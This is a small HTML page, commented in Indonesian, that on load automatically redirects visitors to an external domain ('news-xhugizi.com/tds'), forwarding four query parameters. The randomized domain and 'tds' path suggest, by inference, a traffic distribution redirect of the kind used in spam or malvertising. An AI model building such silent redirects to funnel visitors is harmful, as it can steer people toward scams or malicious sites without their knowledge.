<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Fungsi untuk mendapatkan nilai parameter dari URL
        function getQueryParameter(param) {
            let urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        // Ambil parameter sub dari URL
        let p1 = getQueryParameter('p1') || 'default_p1';
        let p2 = getQueryParameter('p2') || 'default_p2';
        let p3 = getQueryParameter('p3') || 'default_p3';
        let p4 = getQueryParameter('p4') || 'default_p4';

        // URL tujuan redirect
        let redirectUrl = "https://news-xhugizi.com/tds?id=1261668314&p1=" + encodeURIComponent(p1) + "&p2=" + encodeURIComponent(p2) + "&p3=" + encodeURIComponent(p3) + "&p4=" + encodeURIComponent(p4);

        // Redirect ke URL tujuan
        window.location.href = redirectUrl;
    </script>
</head>
<body>
    <p>Redirecting you to the target page...</p>
</body>
</html>
